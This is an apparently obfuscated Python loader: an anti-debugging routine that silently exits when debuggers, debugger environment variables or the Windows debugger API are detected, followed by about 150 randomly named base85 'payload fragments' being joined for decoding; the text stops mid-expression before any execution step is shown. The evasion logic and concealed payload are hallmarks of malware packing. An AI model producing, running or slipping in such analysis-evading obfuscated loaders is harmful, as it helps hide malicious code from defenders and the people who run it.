#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cbOokEc60AW8zp = 'iUok0LOVc>OX_;`R}eWN_(iv#&%eQkwp~Hs1z!clmq+Jn^E5tAn<mk*ihVXQ)o-tWmG>dF=pmz%QyKnD'
_cq3jvzpgka6wwO = '!9!Yq|01RXP;$yZKfoHj*1C9vP#ju+CMR&xKieP^5SXMT!fh+sTK+|ty(rB*ho$uLcwsUPgHTam<sMdU'
_ckzfmLt2VID2T6 = 'hpnf&h5e@n53EG5qZNQ>i?VJwHt_*v;4QEKA&;ap@?I-ZmaoVmdz=~$A+amtSonsH6^Sw^c@JzibzK6-'
_ciCqurp6gn9QlK = '%mD!B@?R|rh!|nN-f>(cRA}3F35x}}kJ4=duf+m1CH^E3M&c=u8x|T`lA2XMYN)hTtsnvxoz;W+wX?l+'
_c_zrDa_JaJedN9 = 'Cx0J#pH~ArYF{oekc^o~j?J#r=?Jwo=!O_tkyqLYS2q$>Q{B+>l5HW>2^M~Fitu(}BvO%YkpV3A_jv7)'
_csGcM43PUG1yys = 'dwlwknWPDR#nv>Y$i$<Ds}P#~9Su~;y;Oj|$pBxw50`5b`h&Q01P^ZUq4fZSV}!Q4>0D)KM!*RkVK(Xc'
_caAL_KTJAdM75l = 'X|on8bCty)@bZlBeM5z$esE4~ZRRl1bM4e|dkk)1LD?EQ3-AdbfovS$$BO*mEN>Mx^h^Xr%>+|WrtB@I'
_ckXRpbUkKcgq75 = 'jitWm9vHLlt<ylYVuPWKi(}{d8v`{+V*T3606~Wd1-BkU&3W6ozO_Q-q#gr&g@kd%Gdf;{iLII_DOH|k'
_cye4JY5zmylu0h = '5-tynN4%rk=K=md8zxa7q~Q;!DcpPCe0qg947RTol}cmOz8AD+I(G<zBqtC`Z|ieNU%ZC+lP>_;CQU2;'
_ctcVasoELPk3Te = 'ZIItBA=~+B|1`k)R0OBqB5L1SnQP-&@Q>+6oe9kzYbaTLukCdR+#~#83p;4!GP<op2=S70;cwq<6pnmq'
_cpb2V4hoDiAkOS = '&{udd*6ml=U~2*hI?$epyMj%wS}`*fGhMO4gKELGk~1j6w6JmeHpqUUe|B1D496z&dj!#uI)a@t!R(Ot'
_cp4Qgdw1VTQFC5 = '0u7LD;7(>V*&B$+m5>Usd`<#7RQYfV0*VzvsBNT`Pa9G;tl@)m9tWh>>0W^R4zA%Lymf52leggT(t?$s'
_crf7UbFvgMmKM_ = 'G7h)3_U>-~xGXKFl|J;dm@axXiyJj2eW?fTPt6H6jQ6DRQ!8|%;Zx0@87iOE{}6eNr2i~9w*^#6#W6VG'
_ciSEl6Q7EYheOs = 'IkX?W%;&*<wip3q2&<@A_q8_Fxl3-bpb+mNdGf@9^%QXV|Crnf?p>El`!u&jX+}DlvxUjeWf|5qI}{w+'
_crb1RTuawmjAi2 = '60vvhxqK7!WcN)^TT6!QFke3csPE_qr{<G_BGF*eUK2Uq$vA~e_C9qKcw1|jPfWK6lug*WhKX6jXmrMl'
_ciSQjshjagt5gR = '9h!?CK<xo-@M8W<Uf|BJdOwWEFT?^8$&ebIHx#KfE5Af=l{sU^;VxuRSCh4wmMN`=z?)iW-*Lfyd8|=s'
_cw_nU480b5FIBe = 'qp#W<0EO05ke2g8vQ9BO{oRyF?}pLo7qJ4_%iHslGFS~oLH`ag$fxi!@<dVUraKVVU!X!yp^=o%3hxw2'
_cvM4n03wy64Clk = 'mETD4-X2gN!CtT;VMcWG`U+Qdsk(g@(XmZYIdoJE=h+wycs27_xEwYLiiIPiVY;qKgcCHnUi=1|Olh22'
_cpT5fx3WgpVp3b = 'IicO6a>Kft-i~D2Re+{Ie|u+21SkF(kIKHR=5Ip*=^vTeti-c*?sM~F{x4hqBr>FSR$OF{nUd#vT=Q6*'
_cmxhhu8bGWex2F = '7QBdCwA~5ImO!<uL8puk;Q5^vf#;ntf=lzr8w`tLbjPA}b|orB(l(u2e&V6xzK*=C{C3^`mlTvIj#93Q'
_cdqvRhu3cUhouq = 'FlWlcMrU;pjz-C+%^T?}<TK}63|k{1l(HgRz}l3gAjD8ri5?LXl~&uY2Q-;OFj!ZVnUbZ5L!R&!+VFS`'
_covGiT9HwzeNOO = '!zn~u&&NsZcjZ*dKsP1{v%fst1g$97)>Qkf?VCUeT%>olef=!FRyF_oz17-8VM+JFWTRKMu0Q)S_B$58'
_caEk9Sx6NO_uwJ = '`@)f;1Z_?YD`>an0ybod52t(mik~l!)E1za>(V3PS<fhQu1FkR?UD<ZW<s7fWBzh}sWC?SBq6TXCuTHa'
_cnIKjVG7IBrq7C = '5r<mT48BbYJSu#!WB}NWT?U*w{?P#bBYvAs9cP4y&4f5qt*^(b3u-W*nR`xweWnEh)=x~uxO*Jzek<_t'
_cdqjUMnc5M2XBd = 'z!)k8A3=}XtI<fMo~&6a3E40FV4cN^5&{B;QFMhnq6!u8&#~rHB<GN@JG|)w`;wt?*Hl+I{QVHYosMVf'
_ceK7iivuPb3Sgl = 'zOJYafQCu8GlgfGSUq&V(k#=0PU^uWJ{eq%F4)Jl80j)L`r(%n7W|+pJ5xE9uD{3OyEL<<IIl8*1MQGo'
_cnKLyFqXL49VD8 = '{B(|W`#Rw|5KBpVVu~)i8TX)N1Do=1%O_5HcEe5<=+LL=WNhcMb@NlyzR8$F6&#%Ip9R@?Uo0~;l_bIH'
_cg_F5beECG4Fbq = 'QQWF?`<Cp|$z{x=7Y*;0Hv>ymSyBLmG~@gVpD_NMa>BX>djaD99Hbnjt6Wi<r{pv5G5!%pK6eVytq?{M'
_csEuh7WMomNYFW = 'gQB})ids;8eh$)$$F%7ypkY8=SxZK73BNRjv%}|9l2TRNr3a*<)9Atw+|@<aL#eBXF#>>531KtOKS~7w'
_cggb716CJJgBPV = 'cJI_6eiwM1!n#4Q(F$1@We{mMMMockaGoreeJ7G<rmVGha@vov^HmlHlsSCT4%GT&0tjCZ5RI*2RR&}<'
_czY6UcWX0NIA7_ = 'rs*Aqw&6q1{?1xgmKQ6Xr}G^XULA=9CnVCTcp66HRKx@BXz=m-y_8Fy8ej!5JISwR!kik3E^fPFE1`oG'
_caJEBCvEKUNsFQ = ')<8bavhc>#JzLt#t80(yVgFfBN>a@ZUnEOqs%ernq*K2^^m6D=6e6!Gq%Oxlx4s{aSHiBO=2E3|t~+lD'
_cqG0P9O5CH6CZY = '0oimG$>1oNI2JiK7&b9j+=MR`co0gX;S)x1dCG=@Dqhpj+#X(A+K1`t)ocOa)OVrP>3{#T5B=cwmaS)='
_ccp4VVflVdYpiM = 'U9)3M#WHbx_r{R6hSc#fn(yp1^nAo{dZ}!m7#KfDVZh6o+%OL+uWy5{32Ub7n2EmeAC0sw;KI#mHd!E4'
_cpPe01jzoi5hhU = 'XUhT>?@0LHxs8T_w*mHR^-qSJS`o9YBQM@dRf;WksLQ8zrC!iFm&YzYgVT!q>mByz%E1QpB1KJ?9#qAE'
_cx5OzDO3GQCM7a = 'RT%^0#G#5wzg-zi?@JLJ%{@altT@AJ>_RI1_)o<jkQiuZ0>H;xt5OTL>@B$T7mtRu!WIR3Z`Ia9KJHFu'
_czlYTujKTzzX7j = 'a9<9MDEg0x50ahjZhv*mpiPvvH}k1|+9a+QgS_16uFK6@s>XxQPsVoqTWKg`Awqp_IdL&W9J`d-UJLgJ'
_cjnBhi5EgLrdPB = 'T#v_`f=Y;8fsn9)&fd{z&NJacWWFXLGw565wp(KG?Y%yw(`yhjiH}scb8uLTX=YJkT~OML?2#1zsilNi'
_czJc8nTCVLtDIL = '>erTW2}m$Lv)$X|*gj*%2#DuDamqCs8(+a_`i%*;8g`%<R%wPXImRnhvT)j29|smk4fg${dOwxF&v0g2'
_cmP2JBiMNFLWzE = 'sLP`O$1d?hR$B9$K*e=b3@Gd>Ccz`GZ0UJAl?kfl30wO;m@1deccgph@krcJIp^Nz_2>e9Fjsec=O02F'
_cfZzc4seeZxT30 = '(wWkv;5CTF7Ek96SkrKLaTGSm{Cc1gTKd%)yy^EUKjX`c;a3z0ah}-oh-t|P&CplQEEp?5ZW8p=-i?wB'
_cidbAvTtfgM6sq = '@6HEA;^L*;Qar~erGg{NW}cco8XXbs{y=4}z4+8(ySF$gZmQDH4<xppie(h&DR8&eR(;x;?%g<4OQYsw'
_cmcJ4M0NQQUl75 = 'tmDPtVZ=v($!Go);wukvJ~Z-3=zx71`Ya@E-}%j5UmfsHnXX9P6fa(n|1fd_z4)QHPRxMx`%3_nxUOWf'
_cjdoSkLMOjXgpL = 'od7p4S%q0dN83akJe<UG?iZQC-c)62A5T-L2^YLlxXHYc&T>)9+&f|~h^r1tf3_@=?f@9*_>}I-fuX_h'
_cnQsjkMxKZu7C3 = '^4H0_?@L@2vwxK6m_lsIbMbag+9GHudy=OE0}LLw2n5Y)gz*o%ODk{@BuOA(osCLnAs|PfuQ@iKlFe>p'
_cfvIHeUJx4UxAK = 'LwUoR=U1T0S;`yCjqiYK+l+zg4@FbgL0Ym=fsM|JaAW3k5|5^)bnxL;f&%V}9qnX|b*`z5xgfRgE59w|'
_ciEcqFdUqWT4Dr = '!o?(Ar<*b~?yFXVY2Ut>m?xCAN5#jX^d0$C^8&l;!VKJ34Bk9v3S`P-l2I*Sn4w++HKVe%(x5xEMHgZV'
_ceDA7XWfMGeYPQ = 'DSJQ32Mu6&4rcOU4?o!}+?Y+_IfgrFR#Rz@fN_<k1Q|z22l<5X1Am?+?-Uo5cE6B4D9DhDBwZMk%Iwy('
_clFXMmQjzTOVL0 = 'HjMQJzv@Qc+V2JoV@iNa6wz3+1qfEZjsNFu$O1P7$wx%qu)qs#n%o<g$+d3W8tADibjRkfXVu0_=1zi0'
_cgsrbldKy9HnQx = 'HdibJB3PY!8kgK}480a2Tb{GEdQ^&MKx<0;_5f>H$Ev32LlCH}du+DVJ&;nBYzA)j3j}(mluGhxPz89g'
_cmUtn8tq4YdG_C = '6z*z{{x?2q?JpnFuNv+fI&>uJQz`Q^P?yG4kdsahe$Z{!{NfaTqB#n)5F&StUeWbG%b(Yit!V6mZ6e&A'
_cd7TOW01Jvp3Vl = 'l=zS)giM&f(f<HZ*X4|4xp}Z?pCXzXZ&U)h3sW56^xk?vWS}fb@Wq5K<)@@lmH!#HlMSgS3)OOz66PZt'
_cblWA9Lcr0MvjF = '#!kl_W6*>R<lm?2%OfcK{<~B%2!~|m8!M`fwga^Zn}I@qeWsD8MKeOA)kc~5jNKlZ4Q@h#6Y>^B`IqPY'
_ck6Vg21JHJm05L = '5|*e#!}LH`T=g_SiAtOHCtHM(F{vT>*0aUfBbCts6{2)x`d%}lCM0(CEHjB*`1A?epM(=+_$S{c3TQEs'
_chp2c9YOq_ndxT = 'aLY*s9fL#VFd)LgFKqOkac;Q0iY3&>kxt(GE1_byHy%jAo#=Qy_z{g?m7t0-N}hsA_0JVnyOrk?u`aej'
_ckkfgrC25jY5R1 = '-uU=!@_zjGlgt5uX^=n;7X?r;Q!FrPBuTRiNc~Z%5(L%|fI8Tw>4*tD4nx7z$RDdswrr?Mk28>?M%oc`'
_cqAIpoTIu2_Bi7 = 'cu9Oud(Q9gW5#Hxm!(F`zDDD$(DDn9j6@8HNn##j?gQ5ZE}s2d#1?Oi7t^(c@6quLsb<2FqslJrmLj^H'
_cmfhQ8ZPZCH1xS = 'k^uZaDg`F_xGF4~Qlx$+Orf^Be;L*if?5B(C}lQ{dV3&8j5+&=vay5x3j?;X=u#U+dT7zn%?n|M7<Lah'
_codp0M1rIbygsK = 'Dtw5WrEIxeePt00(uO{nvWtrdsT%E%y0;(Tc|EIrR`GoSr>c3H_jUCv)ge8Ij^p7LW9rvlMf}Dk3{g*B'
_ckJErCMJf2cXef = '$q0)i@PJ>b6oU5XF6!m~07RFSr_;NgH_IlyhxTo@qwM$vTWx%x0{7Q79iSf!Ikq#J*is%2e~B{osl<k!'
_cfWV3KFUDnW8ia = '3-A>`6LH|8JU?vw>5cDXxd`Joj-ntI)ZiW10RPajhz=6Oe=i3V*J@}>ToRNAOb>eoW2hm79e97xn{5*X'
_c_7BnkE6LKpu5l = 'eFN5yy<Tw~aTVaMn4Otc68UpJcjOFc52$FW3|!LHBP7l;*|$2q^n+_+VYU={*uFAEJRr#?7a|Pz;$$4y'
_ca9gEb7iWyV4GO = 'J;2~vSeB}-rpd1vMisi+2wF4Aa-JG>xuVCSGkG&Ez?*wW1a1h{G`<%A`Q(087)625!FY|y0%nfZ=#;)W'
_cvRuNcAbUGK6Ra = '<~ShQnX!mWV*mGh=nrX)r|3o84ALBuP!or*Bgje5sn;LxUo-BJ%N;Iqf5KVr0#tYQuJ-M)q!MsGYe?fH'
_clgt3ELT0GYeVB = '!%lvQVZ}`M7<X?)Nh2_GrqUCC80?Jfki@@nL9({=orFxzoIc=Zm=U>fFy++G=2!fVrLdT{#zHk1Nm5Cj'
_ctzM52fLFj6hyv = 'oP!pujxkLyXb;#gN&%tN2fic$=*=h47sMzl)XE{+c~oWHfjtaI!6_Z*4?mXmq>mv(f_P2HK^E5g3q?*h'
_chIJw5V6fzHwUG = 'p!`)EdU|^91GZsM&x~7`Jo~1DMniCiS>5MJeQ$Bemrp^74Y=M)8V$f6-Rh^LA$O(NMBao7TAd9s3Y!k`'
_ccgOfIXhl2F5MZ = 'Xfm2LO_Amt14FIL+dgW}urw-L1U+P4@4V7QPDPQP5w6}X)jv|!$sU9QqmOQHh9{ZKg`lxZO0GH<yct~s'
_ct_LOjG3a6cFjX = '_x3Af38|bujd5P54HiJmEZ=~?CviZT<2}CP;mEz$ap9CYm>oGoi7_i6bn8s?OLB^B2m{9vNzD#YB=vL<'
_cdnEAyKcOhwq_Y = '<>Rl;S0fE&Yvb@}#$c7=%fPRvl?|$yy$U2qm4mfP661T=w;L09xHLgmQ$lRDt5Q6J(kyx1tpS5+c@YgY'
_cpm_caAIbvM0OJ = '8l5cru$(&xhHW#yi%as!Hab5SVy#jvb3bR}XJN8m=6>RT)phu0^Vh{fsZ033qXI*T`w7<HGOv}Ja+d+Q'
_cjm4YY9YKI69Q2 = '3gZ~rFAP>B2sD9H^9SQbr}fwBi(??Zw20}ioS(-*I#{STTV*O$B|>&_PJzbfy1RR>UkV(@K6A=V4(Z0+'
_cw0lOD3hUUnKmd = '43s1ME^xE`>k3`Pc#^D~*ItRlDgZ2uG?n!qWxb>R9kUf0bpaVTi*K0D4pfvE;j>G=Il-9DbJsDkH@BW$'
_chdcdMeLFKDsIA = 'V4?*W)Tt!c><YR+erT*g@#xfuwrC#;7BpF?d7J;~b9i0of+1=A?v=7w=m+c6_nTCqKS91WP4bFmv$gdX'
_cfclatct5GRfhJ = '7^SXQAc<)(Z)yR-MVeM<ZqT5)6U2x~)dmH9)N^7MmEu5RSv7sE2B>aR*x62Hab&UwqdN^Ji=+F8fXMbL'
_ckKdCVyIa_Rylv = 'g-d9aZopHQxeJjMJT*W)5}Tb=Adv?7B^(A!O5DS820ALoD6)6faT)l~If=5T<s94skhmckYIR@m=;q3)'
_ce_xaB7_eJhLNf = 'Wy@eg@2YGGC7T$AP%UKhWRE*9H<<m8y|zYDH7aqT@=E>xy8wB-a5M4hy_V2usXCGFb$79_Dooem;0(C~'
_czUUgRCS8ucdW7 = 'MygeQIDJ`^n{^!t7QBfje_^ORJ^5Urx0G$KmUe~{>=l)a7x2;rjUW9-lu9yrd^qs!F%2C=9bosHgaCz0'
_coKXrbHW5MQ7VP = 't#^ybQii$5!l@U4xVWgff6<f0Doz5g1!!aP)z@=X0X8gGC%BvO3$gW*Q~DMFjz{Ecbq!N=Y|QUN)peGh'
_ci7B23MwVQE6uN = 'rHVdbSVJK2{@a^oNb2u2@Nhz0*QW&_RN}Y+ui_diYzi{DKB1oA;}g^@S2~Qez#<01%wBa`M|v91i9VR2'
_ciXcYxrHo4aqrp = 'g?OQED!sn41@Zaq#VGyo08HWMAVD(oy+@xx<KA&K7Jo5kxIGtW#{`lJIRHm0P;E2-!UTrn9S@Jk`dp4F'
_cihumGR3sipWpZ = '+mu{#J&DOK8n!ny%y8{x3d`Q+o6Js(MFxo+FUfUY1bU_$HWv_jw!gSE17${Rn2e=0ORGHzy9D<TFobB8'
_cfC72eIIV87Ekj = '=zuwE)7^J4D;88eMSW*_{@YGf&tQNo#QSG2L3F$6s{N_r7i0O~Nr<|t^4@7^9+1Yquj}eB?y^XKEdgB1'
_c_uBfoiHuxvi9d = '1$MNKbRyltfiPSo#jIZZC=)HJ#7VOVGIns?tw@VzR6)|f;~SeXs~5(`RJhAku2iuwNWF>Is#*{cI!m8v'
_cwSnOwaNI_Shy9 = 'Twx|D<+a<j<awD37sFh)D{u083kH2Nzu8NTRHI7#b7TpI9ZCeNh^OV9^Oc0nQfZiiNC`F27KX{P0j%ym'
_cyDRQw8QqS9BkQ = 'wZF*S`XiI9OH?<X$+gE3lL+sWJf;eiv0=vgzB(<mV#`6%(W572`}YZP^YKSRtk>&w(7{t=Sp%M@7W4_S'
_cvWhtApR0pruwc = '41(Oi`;c7;u%z*W&<6Z(9yR{)mf|emC$pCJPNWUmOkFI4;n!B{0E48yTRAWgxSl(8LXRjDAVz3FzWHm%'
_cxuIyppLMldrqP = 'd&M~Lv1ZqF+n7s_9GK#j$iILTDnEzlt@RABpe<(Yan=-qRc|qi5-Mbjy3_iQyMoc#A^hhMkEB|+a9g?f'
_ccEE8F1QELS6Fa = '9t)fmf4sJ#jl#IOdWL~pIo+$_=x0k!3pSqV)(f*l{N+S`PIjJe*_u4JhYgG7oYgGjkeZ_)WeZ0$*tl}e'
_chS61yKb3YGI0I = 'bK{S4Of&s^Nsa5o2v?QphtSV;xEAnkff#KSXn@wmrq-w7D51hV+~{j~JAA8(z2PW**j)!opIwd?ua#ac'
_cpUyyItHXCJTUs = '!^m;tKR34WiztUd@JrIyM0zPNL?AB~QPOkgc!0QP7o^zB{~`wdY)H&pL2m#3HKB>Tvi(^?e+-5677Ys5'
_czwh1MotxQhS6o = 't*z4Nzo+t4l|6#BB|Vt>g>z}mM&A#%yp;xo2JKs2;w6iWSh!?gTVzgN=ob|}&9*imq?4KuAUR6J=ml3e'
_cw6S1SFK3pR1_h = 'x1bWRDRRI2<O^(XbCni&9JPL^@d~z-((@mf^%feh49K%DujliJ;t8q;bQRhcO`nVBQQVQuvh*;?yvbEq'
_cc7Vje8J1Hz2kO = 'qAPcVH4dWVe5O!T<OZz~pB*~>cf7<#Q`oa^2fIbdPmMR;x4zg_9`n*SdQ@7m6uM=?pGu0}4lYFbf+box'
_cwNcfdem77nzso = 'Avg#@X(Bt=Tr(iEn1#NJI1N?UIsWvS2g3<yvZ9F=>k7N&w#g{^SdZ0DK|Pp|tPf&G5-FFfHFEt?b!oj;'
_cxWkOOhtsWFvhd = 'MatiqqV>5{f<~sYlS&Bi$<lrUigsoSgJl@$sH5Sz2nkO5g}K7Lv6|u?Jr-{ZBJ;Du%?NY$@4S^GzQ~*i'
_caOg_ZUEgmDbJU = 'L$*@nco+>22CVi|UFen%IokAoMN*#g=v%DeNYIseE&V`jR<0<1c%>e>-?OCfUXZ5k-BuS{$68LkMyC+u'
_cw5tHOiN3SKUOv = 'h`OM!U+Y*0@>6nkO+l;?v%BkfLWTg`#g(iB7ugG8K`hn*GztE-S2(?WQk&SrT>|8JJ?Km@q<DqvnDFw)'
_cgQESquyqW3Xj0 = 'D!x;K=&3jB-ZbJ*M4+cpuL@Xs=V1nOt?o}~fqV_Yw;1{*n4b0)jF5KZQP1eei6P9!aZ6}+Q|@BOnyIAv'
_csPIO8Z9rtnb3A = '8|rHd;!;#>RT{5<V{r-dfgufvE)25*TjUe6z5%NEQf}2dtovT>pWjKEcT5uNGHAj^UbCzDj!9pn#QrF^'
_ccpc2SXhS9rYsw = '6e@|6Y;Ut%$k0he;fu!|!*CSoCc*S9r*>?4J_!1@Vf9Wy4f=i*dy$F)<QM+3mY@djz5kRMT+%YuGnT@A'
_cmhjDh3LANf2nC = '1_`)hMZ6kDm3+_M+n#2L{*=^S51LFiAHK53t_Q=QLJIVH6b~J^6T_~j<JA2z)xvtke-bQban=J55(dv%'
_chjdvMALcl4rjE = 'q{5h#zgdnBhsI)j-a^(%oh%E=VY#!(6su=kU|$?d-(f9B0U22m+YC%&PvhyUJgoasZ_FrI+n_h!u9EQ3'
_cxGTZaEoxGZySt = 'zvwPtcWDB?o**IoUc)mCI7%@C&|?BMFe#@Wg-$Fv?(Aj-AmxNqry<1UnYqKlM}iPI%Gf@}@3}G(qk{n0'
_cycFsuKBfJdg07 = 'J7RjgU(+!bej>*TYiMLhb}KUcsy3BiQli!>n(hpm`T&&@vFNt=DtE6_LHf<kNR;}>3bt@f0<8at2Y=h3'
_cq5QEVr0WcUzq_ = 'u7Mz;(Kh@&-AmOF_qU!sqE~LV<;fxfDAR<L36mJ@`3&y$4<<gjms1lk0{Ls{e*Ryy@?Dt|5ThU_3rr=?'
_ctYg0SbXfa4JrR = 'MY&e?K_D3U+q6b$_hYcvgS1fSiU|^4yky@GKLb%TY0MMC8E3MjR>Z6!7-RD_>BuPAfRx08`H%`y$${B<'
_cjzXYUDAIfL2vv = 'B>~s6K7@N{G7xDb??yrO*VFS72`GIMEd#0<8tq3C+Vo&ma}xJn<t>V}g4CLP7lnmn+BEp~)v5yH1e~Si'
_cz7HqYrqyRlPCK = 'PA9_gOMq5OR<Vsv*e2MJ5&@oM0&yO$r0#W~LlC!67=x?QwH0DOt+=WfGvNZi0ZqbM+RrEK+BUcD2wwjH'
_caioeoEq4A_Mp7 = 'toEeyCF2a4u1$&rlXyM)xI=bA727~W&#`^qQN#o#w3tz27ob%nAttY7y#|gg@By||bn68YAmHZBO4)?w'
_cpeKuGyA_r6Vw6 = 'DE|H*QSrv^sq%yMRBQfTvKMe7UGyTfa6)`n=YSX@4`?;k=)F?CIG1ozf!_Z;QHvQp;T1%XfRs(9VHpv_'
_cpbVgdXfPklxcs = 's<Q4fdRx3b@pUxsmpfaD61Z%?ikrTu-=qgLfMdyNb$<8-pi;Xhi2`B`#h+ZJLEQ$zk-uE_WOB{xkD?jU'
_cly5Vod3dALkpG = 'X2YZb^^+-tKhl1!cO?k|o{2b~5WXe(vevS@rpFqt<5Wk3ji|E?iFOg@Fl#c8RDGGdZ)k<mSpT1-sD20f'
_cmY597v3KmSs71 = 'c8mMID(hQaX4O<yOJW-C_LOHT4=nKGf_wGt|73?2Rp<2`rAPLfcar}Jfw3OR<N#j~G{n{A(Q%xk7x6K&'
_cyjYw4tXr7gQ3N = 'PKRsU=^Q34b9*U(O1%x18XembQ$;%=tQbWErKQicMLUam@A&|Hv^gC%?0W|UOHPxS&=7fK<ERjG2hTRK'
_cz7rspMQWvXOrd = 'BhA*hv4Aa0EzXjtST%$l5)!z31jPAZuI(7cpgxFrtnnajud!|IGV-p4rhEI??$wK`;-7#w8+oY%BsJ(u'
_ctrO4iOniZ5xPV = 'q3J<296J<AXRT+<E@aifZr^uF-FXWjX79!Bu!%D*3qE`=QF=Cwl=&Z)UG9c*%rBm$!mw|h1o#WrI$_nW'
_cgUkAkHTaL_ILe = 'g@6`#Q&*S355^F$7sc?<>CrI;p^ovPP!76yC+`425qfDBUR~u(y1Sj(D0OX2(cYz#!EY2#f1Psxm*J?x'
_cmcJthnPsKxhWO = 'zL<Ny6D(yv?oZ{B2Ek8^oA7oDpw41&rx8FK7=yZTWqEr8xJ?8gS})ace&zjDktlXJoYh8A47X{LaRN6h'
_ccftaTIzhv55ih = 'Zz`~=-kl&1(YkXIg2UkLC1hC(-OP1XqL67av?jDV6M`PeoeM9Zy(Hc}Koy7%E*=b_b9j)c8NW~@=EWQ8'
_cwGtNWqEo2wyT4 = '5XotN1p`@tpkTrLOkya#>`>hL;C!3$;ToLpI-Oz<{>R!UjMZs#JPZBz2~gFhe3~nysv#rpx|FWu*-F)('
_cx7odH7uXvRGE9 = 'aa~SZT6X=tTVqzAP%sLfU_lX(mJ}gyJq%*r{U>RTS9LM^9V|ues@3jPwF*G8donB}T&dvscQAbf9bs>$'
_curVfxPvRKCeHK = ')#2Fd4WAVqYBGW?q5z4m<87;)VRi~+gce$EaaO?nI$V!vI~hLHb!Up|#O;pBuOl)kZ#GtMZ@!E|MFBa%'
_csDaqAP2GFzACT = '1YHTh9ik^JC#5%J)qa0AouE92kqP{%=X_(oNbPRs@>NuP&|s6^xQ$s=nl5p>Bs#~9J)qlzyD-+8!gB&w'
_cgCJnIZX8P8ng1 = 'edMlhO>`_gdZXG<q#p{2ae)~&BO2jaPn+Nkq=dwb!WXEa+A@|#%5V`vUo9Yyk3Z&TCrel(17MmjI`h*s'
_cbxAMVp0RJjKc_ = '(1&d}_;0{XG!Wdj!AUO&0H_iozR!8Wq@L((><?qB0a{|?34^ehUntj5k;rD;4vT9$Q|f}f$QbM%aY!f2'
_cnie4jbBCuQcwe = '3iEt_kK0wqEunrIe^JzCpZ~~6>(36FZt+<&1i4?}gB-7cu557S&8?hc;QDH%Qs}dX(g?H2czk_?-Lv-9'
_cyEKxU7DQiXSz4 = 'uHlerc0zyPR2@aQb%+vDaQh6TfV@9M1`da;i#!}pT03NbdvQ~b?f;~C_VXFk$QxJr%TSA9iF;sp!d#<8'
_cz1hOTiYa4MQlT = 'IZmfHH|$h@4ATERo{ay(or{3bFuCR9KDb?)^VNZB6Q(k(?@n?AR}XFdTWux(laJ#AJ#Yz7fdh_pngcG&'
_cfnfk0li08KVeM = 'vhWeMUj6k;`f3FVOn_q5k$Ze!s^u@dTZSs6t^@5Rh@#eO;l{iBYuD6`4baoX08w}r#i{9}Wy(@H!vEt5'
_ceXTUJgFGYgd0H = 'B9kN>+L%7Q5f;bf0IWLkXQY1yQv6mY&R(Y`Cun5`Enmc2+NNZL-2i8uEq1VdBcz7AL*wWqO=SaD{pq#^'
_cpjqy5glhSwtXE = 'kP^3)s4e)`1Q{ZZv<;^K`ivs6O+^gKd8Yi<l``az8;HBQxzzF%2Jx`F*l=V!A7I+3sv|K@##zbncJb<}'
_cjuvAZJJ4m74hF = '6QlErx^{fwUOXAsL_f4lAtD@dEgdUByBKH6S5I!k4|J17%Dwesl3`Al1ZzWJ`=4BLdd)bm<msl((qeOi'
_co1MRan7omslWF = '2K}9eT{^;469'

_pyox138t3jmAVm = __import__('base64').b85decode(_cbOokEc60AW8zp + _cq3jvzpgka6wwO + _ckzfmLt2VID2T6 + _ciCqurp6gn9QlK + _c_zrDa_JaJedN9 + _csGcM43PUG1yys + _caAL_KTJAdM75l + _ckXRpbUkKcgq75 + _cye4JY5zmylu0h + _ctcVasoELPk3Te + _cpb2V4hoDiAkOS + _cp4Qgdw1VTQFC5 + _crf7UbFvgMmKM_ + _ciSEl6Q7EYheOs + _crb1RTuawmjAi2 + _ciSQjshjagt5gR + _cw_nU480b5FIBe + _cvM4n03wy64Clk + _cpT5fx3WgpVp3b + _cmxhhu8bGWex2F + _cdqvRhu3cUhouq + _covGiT9HwzeNOO + _caEk9Sx6NO_uwJ + _cnIKjVG7IBrq7C + _cdqjUMnc5M2XBd + _ceK7iivuPb3Sgl + _cnKLyFqXL49VD8 + _cg_F5beECG4Fbq + _csEuh7WMomNYFW + _cggb716CJJgBPV + _czY6UcWX0NIA7_ + _caJEBCvEKUNsFQ + _cqG0P9O5CH6CZY + _ccp4VVflVdYpiM + _cpPe01jzoi5hhU + _cx5OzDO3GQCM7a + _czlYTujKTzzX7j + _cjnBhi5EgLrdPB + _czJc8nTCVLtDIL + _cmP2JBiMNFLWzE + _cfZzc4seeZxT30 + _cidbAvTtfgM6sq + _cmcJ4M0NQQUl75 + _cjdoSkLMOjXgpL + _cnQsjkMxKZu7C3 + _cfvIHeUJx4UxAK + _ciEcqFdUqWT4Dr + _ceDA7XWfMGeYPQ + _clFXMmQjzTOVL0 + _cgsrbldKy9HnQx + _cmUtn8tq4YdG_C + _cd7TOW01Jvp3Vl + _cblWA9Lcr0MvjF + _ck6Vg21JHJm05L + _chp2c9YOq_ndxT + _ckkfgrC25jY5R1 + _cqAIpoTIu2_Bi7 + _cmfhQ8ZPZCH1xS + _codp0M1rIbygsK + _ckJErCMJf2cXef + _cfWV3KFUDnW8ia + _c_7BnkE6LKpu5l + _ca9gEb7iWyV4GO + _cvRuNcAbUGK6Ra + _clgt3ELT0GYeVB + _ctzM52fLFj6hyv + _chIJw5V6fzHwUG + _ccgOfIXhl2F5MZ + _ct_LOjG3a6cFjX + _cdnEAyKcOhwq_Y + _cpm_caAIbvM0OJ + _cjm4YY9YKI69Q2 + _cw0lOD3hUUnKmd + _chdcdMeLFKDsIA + _cfclatct5GRfhJ + _ckKdCVyIa_Rylv + _ce_xaB7_eJhLNf + _czUUgRCS8ucdW7 + _coKXrbHW5MQ7VP + 